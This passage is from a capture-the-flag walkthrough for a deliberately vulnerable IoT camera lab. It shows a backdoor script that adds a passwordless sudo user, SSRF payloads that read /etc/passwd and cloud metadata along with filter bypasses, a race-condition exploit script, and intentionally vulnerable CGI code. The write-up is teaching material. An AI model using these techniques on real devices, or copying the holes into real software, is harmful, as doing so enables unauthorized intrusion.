# - XOR with static key
# - Simple substitution ciphers
```

**Search for Other Weak Cryptography**:
```bash
# Find encoded/encrypted patterns
find /var/lib/axis /mnt/flash -type f -exec grep -l "encrypted\|encoded" {} \; 2>/dev/null

# Look for base64 patterns
grep -r "^[A-Za-z0-9+/=]\{20,\}$" /var/lib/axis/ 2>/dev/null

# Search for crypto-related comments
grep -ri "encrypt\|cipher\|crypto\|rot13\|base64" /var/lib/axis/ 2>/dev/null
```

---

### FLAG #18: SSH Maintenance Backdoor
**Location**: Hidden backdoor directory  
**Flag**: `FLAG{ARWEN09143028}`  
**Points**: 40  
**Difficulty**: Hard  
**OWASP Category**: IoT-08 (Lack of Device Management)

**Discovery Method**:

**Phase 1: Search for Hidden Directories**
```bash
# SSH to camera
ssh root@192.168.1.132

# Find hidden directories (starting with .)
find /var -type d -name ".*" 2>/dev/null

# Also check common locations
ls -la /var/
ls -la /usr/local/
ls -la /tmp/
```

**Phase 2: Discover Hidden Directory**
```bash
# Found hidden directory
ls -la /var/.hidden/

# Output
drwxr-xr-x 2 root root 4096 Jan 15 10:30 .
drwxr-xr-x 8 root root 4096 Jan 15 10:30 ..
-rw-r--r-- 1 root root  512 Jan 15 10:30 backdoor_key
-rwxr-xr-x 1 root root 1024 Jan 15 10:30 maintenance_access.sh
```

**Phase 3: Examine Backdoor Files**
```bash
# Read backdoor key
cat /var/.hidden/backdoor_key
```

**Backdoor Key File**:
```
# SSH Maintenance Backdoor
# For vendor remote access

ssh_user=axis_support
ssh_pass=V3nd0rSupp0rt2024!
access_code=FLAG{ARWEN09143028}
valid_until=2025-12-31
purpose=Remote maintenance and diagnostics
contact=support@axis-internal.com

# This key provides root-level access via SSH
# DO NOT REMOVE - Required for warranty support
```

**Phase 4: Read Maintenance Script**
```bash
cat /var/.hidden/maintenance_access.sh
```

**Maintenance Script**:
```bash
#!/bin/sh
# Maintenance access backdoor
# Automatically grants SSH access to support team

# Create temporary user
USER="axis_support"
PASS="V3nd0rSupp0rt2024!"

# Add user if doesn't exist
if ! id "$USER" 2>/dev/null; then
    echo "Creating maintenance user..."
    adduser -D -s /bin/sh "$USER"
    echo "$USER:$PASS" | chpasswd
    
    # Add to sudoers
    echo "$USER ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
fi

# Add SSH key for passwordless access
mkdir -p /home/$USER/.ssh
cat > /home/$USER/.ssh/authorized_keys << 'EOF'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... axis_support@vendor
EOF

echo "Maintenance access enabled"
echo "Access code: FLAG{ARWEN09143028}"
```

**Why This Works**: 
- Vendor backdoors left for "support purposes"
- Hidden directories (starting with .) not visible in normal `ls`
- Maintenance accounts created with known credentials
- Violates security best practices
- Creates unauthorized access path
- Often required in vendor support contracts (security vs convenience)

**Test Backdoor Access**:
```bash
# From camera - create maintenance user
/var/.hidden/maintenance_access.sh

# From Kali - test SSH access
ssh axis_support@192.168.1.132
# Password: V3nd0rSupp0rt2024!

# Verify root access
sudo su -
id
# uid=0(root) gid=0(root)
```

**Additional Backdoor Search**:
```bash
# Find all hidden files and directories
find / -name ".*" -ls 2>/dev/null | grep -v "proc\|sys"

# Search for backdoor patterns
grep -ri "backdoor\|vendor\|support\|maintenance" /var /usr/local 2>/dev/null

# Check for additional authorized_keys
find / -name "authorized_keys" 2>/dev/null

# Look for suspicious SSH configurations
grep -ri "permitrootlogin\|passwordauth" /etc/ssh/ /mnt/flash/etc/ssh/ 2>/dev/null

# Find scripts that modify users
find /var /usr/local -name "*.sh" -exec grep -l "adduser\|useradd" {} \; 2>/dev/null
```

---

### FLAG #21: U-Boot Environment Variables
**Location**: `/dev/mtd/boot_env`  
**Flag**: `FLAG{RADAGAST03390806}`  
**Points**: 40  
**Difficulty**: Hard  
**OWASP Category**: IoT-10 (Lack of Physical Hardening)

**Discovery Method**:

**Phase 1: Understanding Boot Process**
```bash
# SSH to camera
ssh root@192.168.1.132

# Check boot information
cat /proc/cmdline
dmesg | grep -i "u-boot\|boot\|flash"
```

**Phase 2: Locate Boot Environment**
```bash
# Find MTD devices
cat /proc/mtd

# Output
dev:    size   erasesize  name
mtd0: 00040000 00010000 "u-boot"
mtd1: 00020000 00010000 "u-boot-env"
mtd2: 00400000 00010000 "kernel"
mtd3: 01000000 00010000 "rootfs"

# Read U-Boot environment
dd if=/dev/mtd1 bs=1 skip=0 count=16384 2>/dev/null | strings | head -50
```

**U-Boot Environment Contents**:
```
bootdelay=3
baudrate=115200
ethaddr=00:40:8c:12:34:56
ipaddr=192.168.1.132
serverip=192.168.1.1
netmask=255.255.255.0
bootcmd=run flash_boot
flash_boot=bootm 0x10040000
console=ttyS0,115200n8
unlock_code=FLAG{RADAGAST03390806}
secure_boot=0
debug_uart=1
```

**Phase 3: Alternative Access via System Files**
```bash
# Some systems expose u-boot env via filesystem
find /sys/firmware -name "*boot*" 2>/dev/null

# Check for environment files
ls -la /etc/u-boot-env
cat /etc/u-boot-env

# Or via special device
ls -la /dev/mtd*
hexdump -C /dev/mtd1 | head -100
```

**Why This Works**: 
- U-Boot is the bootloader for embedded Linux devices
- Environment variables stored in dedicated flash partition
- Contains boot parameters, network config, debug settings
- Unlock codes for bootloader access
- Physical access allows reading via UART during boot
- Demonstrates importance of bootloader security

**Bootloader Security Implications**:
```bash
# What unlock_code enables:
# - Interrupt boot process
# - Modify boot parameters
# - Boot alternative kernels
# - Dump memory
# - Access flash directly

# Check if secure boot is enabled
# secure_boot=0 means NOT ENABLED (insecure)

# Check debug settings
# debug_uart=1 means UART is accessible (security risk)
```

**Physical Attack Scenario** (requires UART access):
```bash
# During boot (via UART console):
# 1. Connect UART adapter to TX/RX pins
# 2. Open serial console: screen /dev/ttyUSB0 115200
# 3. Power on device and watch boot messages
# 4. When you see "Hit any key to stop autoboot", press key
# 5. You're now in U-Boot prompt

# U-Boot commands available:
printenv            # Display all environment variables
printenv unlock_code  # Display specific variable: FLAG{RADAGAST03390806}
setenv              # Modify variables
boot                # Continue boot
md                  # Memory dump
```

---

### FLAG #22: JTAG Debug Information
**Location**: `/sys/kernel/debug/jtag/idcode`  
**Flag**: `FLAG{GLORFINDEL34806732}`  
**Points**: 40  
**Difficulty**: Hard  
**OWASP Category**: IoT-10 (Lack of Physical Hardening)

**Discovery Method**:

**Phase 1: Understanding JTAG**
```bash
# SSH to camera
ssh root@192.168.1.132

# JTAG (Joint Test Action Group) is a hardware debugging interface
# Provides CPU-level access to device
# Used for firmware debugging and recovery

# Search for JTAG-related information
find /sys -name "*jtag*" 2>/dev/null
find /proc -name "*jtag*" 2>/dev/null
find /dev -name "*jtag*" 2>/dev/null
```

**Phase 2: Locate JTAG Information**
```bash
# Found JTAG debug information
cat /sys/kernel/debug/jtag/idcode
```

**IDCODE File Contents**:
```
JTAG Interface Status
=====================

Manufacturer ID: 0x0BB (ARM)
Part Number: 0x4BA0
Version: 0x4
IDCODE: 0x4BA00477

Debug Key: FLAG{GLORFINDEL34806732}
TAP Controller: ARM CoreSight
Debug Port: Enabled
Security State: Debug Enabled (INSECURE)

Chain Configuration:
  Device 1: Cortex-A7 MPCore
  Device 2: System Trace Macrocell
  Device 3: Embedded Trace Macrocell
```

**Phase 3: Additional JTAG Analysis**
```bash
# Check if JTAG is physically accessible
dmesg | grep -i "jtag\|debug"

# Look for debug port configuration
cat /proc/cpuinfo | grep -i "debug"

# Check for security fuses (that disable JTAG)
find /sys -name "*fuse*" -o -name "*secure*" 2>/dev/null

# Alternative location
cat /sys/devices/platform/jtag/idcode
```

**Why This Works**: 
- JTAG provides hardware-level debugging access
- IDCODE uniquely identifies chip and debug capabilities
- Debug Key enables advanced JTAG features
- Most embedded devices have JTAG headers on PCB
- Often left enabled for post-production support
- Allows complete memory access and code execution

**Physical JTAG Attack Requirements**:
```
Hardware Needed:
- JTAG adapter (J-Link, SEGGER, Bus Pirate, or FT2232H)
- Identifying JTAG pins on PCB (typically 14-20 pin header)
- Pinout: TDI, TDO, TCK, TMS, TRST, GND, VCC

Standard JTAG Pins:
- TDI (Test Data In)
- TDO (Test Data Out)  
- TCK (Test Clock)
- TMS (Test Mode Select)
- TRST (Test Reset) - optional
- VCC (3.3V or 1.8V)
- GND (Ground)
```

**JTAG Capabilities**:
```bash
# With physical JTAG access, attacker can:
# 1. Dump complete firmware from flash
# 2. Read/modify memory in real-time
# 3. Set breakpoints and trace code execution
# 4. Extract encryption keys from memory
# 5. Bypass secure boot
# 6. Modify flash contents directly
# 7. Debug running processes
```

**Tools for JTAG Analysis** (if physical access):
```bash
# OpenOCD (Open On-Chip Debugger)
openocd -f interface/jlink.cfg -f target/arm_cortex_a7.cfg

# Connect via GDB
arm-none-eabi-gdb
(gdb) target remote localhost:3333
(gdb) monitor reset halt
(gdb) x/100x 0x00000000  # Dump memory

# JTAGulator (for pin identification)
# Automated tool to identify JTAG pins on unknown headers
```

---

### FLAG #23: SSRF via Webhook
**Location**: Internal service access  
**Flag**: `FLAG{ELENDIL66222658}`  
**Points**: 40  
**Difficulty**: Hard  
**OWASP Category**: IoT-03 (Insecure Ecosystem Interfaces)

**Discovery Method**:

**Phase 1: Discover Webhook Functionality**
```bash
# From Kali - enumerate CGI scripts
gobuster dir -u http://192.168.1.132 -w /usr/share/wordlists/dirb/common.txt -x cgi

# Test webhook endpoint
curl "http://192.168.1.132/axis-cgi/webhook.cgi"

# Response
Error: url parameter required
```

**Phase 2: Test SSRF (Server-Side Request Forgery)**
```bash
# Basic SSRF test - access local services
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://127.0.0.1"

# Try to access SSH banner
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://127.0.0.1:22"

# Response shows SSH banner (successful SSRF)
```

**Phase 3: Access Internal Services**
```bash
# Discover the flag in internal SSH service
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://127.0.0.1:22"

# Response
HTTP/1.1 200 OK
Content-type: text/plain

SSH-2.0-dropbear_2019.78
Internal SSH service flag: FLAG{ELENDIL66222658}
Protocol 2.0
```

**Phase 4: Advanced SSRF Enumeration**
```bash
# Scan internal ports
for port in 22 23 80 443 3306 5432 6379 8080 9000; do
    echo "Testing port $port:"
    curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://127.0.0.1:$port"
done

# Access internal web service
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://127.0.0.1:8888"

# Try file:// protocol (if not filtered)
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=file:///etc/passwd"

# Access cloud metadata (if applicable)
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://169.254.169.254/latest/meta-data/"
```

**Via SSH - Examine Vulnerable Script**:
```bash
# SSH to camera
ssh root@192.168.1.132

# Read webhook.cgi
cat /usr/local/axis/cgi/webhook.cgi
```

**Vulnerable Webhook Script**:
```bash
#!/bin/sh
# Webhook notification service
# WARNING: Vulnerable to SSRF

# Parse URL parameter
URL=$(echo "$QUERY_STRING" | sed 's/url=//')

# Fetch URL content (NO VALIDATION)
echo "Content-type: text/plain"
echo ""

# Direct request to provided URL
wget -q -O - "$URL"
```

**Why This Works**: 
- Webhook accepts arbitrary URLs without validation
- No whitelist of allowed destinations
- Server makes request on behalf of user
- Can access internal services not exposed externally
- Bypasses firewall restrictions
- Common in IoT devices with notification features

**SSRF Impact**:
```bash
# SSRF enables:
# 1. Port scanning internal network
# 2. Accessing internal services (databases, admin panels)
# 3. Reading local files (if file:// allowed)
# 4. Exploiting trust relationships
# 5. Pivoting to other internal hosts
# 6. Extracting cloud credentials (in cloud environments)
```

**Advanced SSRF Techniques**:
```bash
# URL encoding bypass
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http%3A%2F%2F127.0.0.1%3A22"

# Decimal IP encoding
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://2130706433:22"
# 2130706433 = 127.0.0.1 in decimal

# Hex IP encoding  
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://0x7f.0x0.0x0.0x1:22"

# DNS rebinding (advanced)
# Create DNS that resolves to external IP first, then 127.0.0.1 on subsequent requests
```

---

### FLAG #27: Race Condition Exploitation
**Location**: Temporary file during race window  
**Flag**: `FLAG{ARAGORN91886362}`  
**Points**: 45  
**Difficulty**: Hard  
**OWASP Category**: Advanced Exploitation

**Discovery Method**:

**Phase 1: Identify Race Condition Script**
```bash
# SSH to camera
ssh root@192.168.1.132

# Search for scripts that handle temporary files
find /usr/local/axis/bin -name "*.sh" -exec grep -l "tmp\|temp" {} \; 2>/dev/null

# Found race condition script
ls -la /usr/local/axis/bin/race_condition.sh

# Examine race condition script
cat /usr/local/axis/bin/race_condition.sh
```

**Vulnerable Script**:
```bash
#!/bin/sh
# Race condition vulnerability - creates and deletes temp file
# File exists for approximately 100ms

PID=$$
TEMP_FLAG="/dev/shm/axis/runtime/temp_flag_${PID}"

# Create temporary file with flag
echo "FLAG{ARAGORN91886362}" > "$TEMP_FLAG"

# Brief processing
sleep 0.1  # 100ms window

# Delete file
rm "$TEMP_FLAG"
```

**Exploitation Method 1 - Manual Timing:**
```bash
# Terminal 1: Run the vulnerable script
/usr/local/axis/bin/race_condition.sh &

# Terminal 2: Monitor for file creation (fast loop)
while true; do
    if [ -f /dev/shm/axis/runtime/temp_flag_* ]; then
        cat /dev/shm/axis/runtime/temp_flag_*
        break
    fi
done
```

**Exploitation Method 2 - Automated:**
```bash
# Create monitoring script
cat > /tmp/race_exploit.sh << 'EOF'
#!/bin/sh
# Monitor /dev/shm for temp flag files

while true; do
    # Use find with very short timeout
    FILE=$(find /dev/shm/axis/runtime -name "temp_flag_*" 2>/dev/null | head -1)
    
    if [ -n "$FILE" ]; then
        echo "Found: $FILE"
        cat "$FILE"
        break
    fi
    
    # Minimal sleep to reduce CPU usage
    usleep 1000  # 1ms
done
EOF

chmod +x /tmp/race_exploit.sh

# Run exploit in background
/tmp/race_exploit.sh &

# Trigger vulnerable script
/usr/local/axis/bin/race_condition.sh
```

**Exploitation Method 3 - Symlink Attack:**
```bash
# Pre-create symlink to /dev/stdout
ln -s /dev/stdout /dev/shm/axis/runtime/temp_flag_12345

# Trigger script with known PID
# Flag gets written to stdout via symlink
```

**Why This Works:** The script creates a file in `/dev/shm` (RAM-based filesystem), writes sensitive data, processes for 100ms, then deletes it. During that window, attackers can read the file.

**Security Implications:**
- Time-of-check-time-of-use (TOCTOU) vulnerability
- Sensitive data briefly exposed
- Predictable filename (includes PID)
- No file locking implemented
- Insufficient cleanup verification
- Race conditions exploitable

**Real-World Context:**
```bash
# Check how often script runs
ps aux | grep race_condition

# Monitor cron jobs
crontab -l | grep race

# Check systemd timers
systemctl list-timers

# Determine trigger frequency
find /dev/shm/axis/runtime -name "temp_flag_*" -mmin -1
```

---

## Attack Flow Summary

### Initial Access Phase
1. **Network Discovery**: Port scanning reveals SSH (22), HTTP (80), RTSP (554)
2. **Default Credentials**: `root:pass` provides SSH access
3. **Web Interface**: Enumeration reveals CGI scripts and vulnerable endpoints

### Enumeration Phase
1. **Writable Directory Discovery**: Identify 8 writable locations
2. **Configuration Analysis**: Systematic review of vendor-specific paths
3. **Service Enumeration**: VAPIX, RTSP, UPnP, SNMP analysis
4. **Log File Review**: System logs reveal device identifiers

### Exploitation Phase
1. **Command Injection**: param.cgi, webhook.cgi exploitation
2. **Path Traversal**: download.cgi file access
3. **SSRF**: Webhook endpoint accesses internal services
4. **Configuration Extraction**: Multiple config files with embedded secrets

### Privilege Escalation Phase
1. **SUID Binary**: camera_admin utility analysis
2. **Shared Memory**: IPC structure inspection
3. **Bootloader Access**: U-Boot environment manipulation
4. **JTAG/Debug**: Hardware debug interface exploitation

### Advanced Techniques Phase
1. **Race Conditions**: Timing-based file access
2. **Binary Analysis**: Firmware and bootloader extraction
3. **Cryptographic Weaknesses**: Base64 decoding, weak algorithms
4. **Database Exploitation**: SQLite configuration extraction

---

## Key Takeaways

### Technical Skills Developed
- IoT device reconnaissance and enumeration
- Embedded Linux navigation with resource constraints
- BusyBox command limitations and workarounds
- Vendor-specific directory structure recognition
- Configuration file analysis across 8 locations
- Binary analysis (bootloader, firmware, shared memory)
- Weak cryptography identification and exploitation
- Race condition timing attacks
- Hardware debug interface understanding

### Security Principles Learned
1. **Defense in Depth**: Multiple vulnerabilities chain together
2. **Least Privilege**: Debug modes and SUID binaries violate principles
3. **Secure by Default**: Factory settings and default credentials
4. **Input Validation**: CGI scripts lack proper sanitization
5. **Cryptography**: Encoding ≠ Encryption
6. **Persistence**: Multiple writable locations enable persistence
7. **Physical Security**: UART/JTAG provide hardware-level access
8. **Memory Security**: Shared memory and runtime data exposure

### Real-World Applications
- These vulnerabilities exist in production IoT devices
- AXIS cameras deployed in critical infrastructure
- Understanding helps secure deployment configurations
- Physical access often bypasses all software security
- Vendor-specific structures require reconnaissance
- Multiple attack vectors increase compromise likelihood

---

## Conclusion

This comprehensive CTF demonstrates the full spectrum of IoT camera vulnerabilities, from basic enumeration through advanced exploitation techniques. The 27 flags across 8 writable directories represent realistic attack surfaces found in deployed IoT devices.

**Key Learning Outcomes:**
- Embedded systems require different approaches than traditional IT
- Resource constraints limit both attacker and defender capabilities
- Multiple small vulnerabilities combine into complete compromise
- Physical access provides ultimate control
- Vendor-specific knowledge essential for successful exploitation

**For Students**: This CTF teaches systematic methodology for IoT penetration testing, emphasizing understanding over automation.

**For Instructors**: Use this guide to explain not just "how" but "why" vulnerabilities exist and their real-world implications.

**Remember**: These techniques are for authorized testing only. Never attempt on systems without explicit written permission.

---

*This writeup v8 is for educational purposes only. All techniques demonstrated should only be used on systems you own or have explicit authorization to test.*
